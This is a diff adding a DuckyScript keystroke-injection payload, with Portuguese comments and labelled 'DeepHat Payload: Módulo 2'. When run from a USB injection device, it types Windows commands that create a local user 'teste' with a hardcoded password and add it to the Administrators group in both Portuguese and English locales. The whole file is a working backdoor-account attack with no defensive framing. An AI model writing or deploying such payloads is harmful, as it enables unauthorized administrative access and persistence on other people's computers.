@@ -1,0 +1,27 @@
+REM --- DeepHat Payload: Módulo 2 - Criação de Usuário Admin ---
+REM --- Objetivo: Criar usuário 'teste' com senha definida ---
+
+DELAY 2000
+STRING echo [!] Iniciando Criação de Usuário...
+ENTER
+DELAY 1000
+
+REM --- Passo 1: Criar o usuário local ---
+STRING net user teste Issoéducky1346 /add
+ENTER
+DELAY 1000
+
+REM --- Passo 2: Promover a Administrador (Compatível com PT-BR e EN-US) ---
+STRING net localgroup Administradores teste /add
+ENTER
+DELAY 500
+STRING net localgroup Administrators teste /add
+ENTER
+DELAY 500
+
+STRING echo [!] Usuário 'teste' criado e promovido a Administrador.
+ENTER
+STRING echo [!] Verificando status...
+ENTER
+STRING net user teste
+ENTER
